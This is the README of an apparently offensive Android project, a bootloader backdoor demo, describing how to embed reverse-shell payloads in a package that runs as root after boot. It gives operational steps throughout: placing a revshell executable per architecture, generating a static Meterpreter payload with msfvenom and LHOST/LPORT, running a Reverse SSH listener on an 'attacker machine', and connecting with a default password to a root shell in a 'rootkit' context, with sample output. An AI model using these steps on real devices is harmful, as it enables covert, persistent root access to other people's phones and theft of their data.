## Custom payloads

This directory is for various payloads to embed in package.

To use a payload, simply put an executable into `revshell/{arch}/` as `revshell`. 
It is not required to place payloads for all archs: those where `revshell` is absent will use default payload.

Payloads tested:
* Simple logcat writer (default) ([link](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo/tree/master/revshell))
* Meterpreter (static, aarch64) - _limited functionality_
* **Reverse SSH** (upx, aarch64) ([link](https://github.com/Fahrj/reverse-ssh)) - _**Recommended**_

#### Logcat writer

The stock payload that simply writes stuff to logcat:
```
$ adb logcat | grep revshell
03-18 00:34:46.884  3197  3197 D revshell: Start successfull!
03-18 00:34:46.885  3197  3197 D revshell: Signals are set to ignore
03-18 00:34:46.885  3197  3197 D revshell: Hey I'm a revshell process!
03-18 00:34:46.885  3197  3197 D revshell: My PID -- 3197
03-18 00:34:46.885  3197  3197 D revshell: My parent PID -- 2381
03-18 00:34:46.885  3197  3197 D revshell: My UID -- 0
03-18 00:34:46.885  3197  3197 D revshell: Awaiting encrypted FS decryption now...
03-18 00:34:51.311  3197  3197 D revshell: FS has been decrypted!
03-18 00:34:51.311  3197  3197 D revshell: Starting reverse shell now
03-18 00:34:56.312  3197  3197 D revshell: tick ! 10 seconds since process started
03-18 00:35:01.312  3197  3197 D revshell: tick ! 15 seconds since process started
```

#### Meterpreter

Use `msfvenom` to generate your payload. You typically want _aarch64/_ or _arm/_ static versions (**not _android/_**). 
Note that staged version might not work reliably, so better use static instead.

Make sure you set LHOST and LPORT in _msfvenom_ command line.

However, even static build may have very limited functionality because of compatibility issues with Android devices.

#### Reverse SSH

This payload ([link]()) has better compatibility with Android and seems to work reliably, though it might be a bit tricky to use. 
`upx_reverse-ssh-armv8-x64` version is recommended. 

Set LHOST and LPORT in `config.prop`. 

Launch _ReverseSSH_ listener on attacker machine:
```
$ ./upx_reverse-sshx64 -l -v -p 31337
```

Once target device boot is complete and device is decrypted, a new connection should pop up:
```
2024/03/18 20:34:30 Successful authentication with password from reverse@192.168.0.11:42967
2024/03/18 20:34:30 Attempt to bind at 127.0.0.1:8888 granted
2024/03/18 20:34:30 New connection from 192.168.0.11:42967: ERROR on localhost reachable via 127.0.0.1:8888
```

Then just _ssh_ into local port:
```
$ ssh -p 8888 localhost sh -i
```
(use default password `letmeinbrudipls`)

... and you're there.
```
sh: can't find tty fd: No such device or address
sh: warning: won't have full job control
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:rootkit:s0
```

##### Reference: [Running ReverseSSH as reverse shell](https://github.com/Fahrj/reverse-ssh?tab=readme-ov-file#running-reversessh-as-reverse-shell)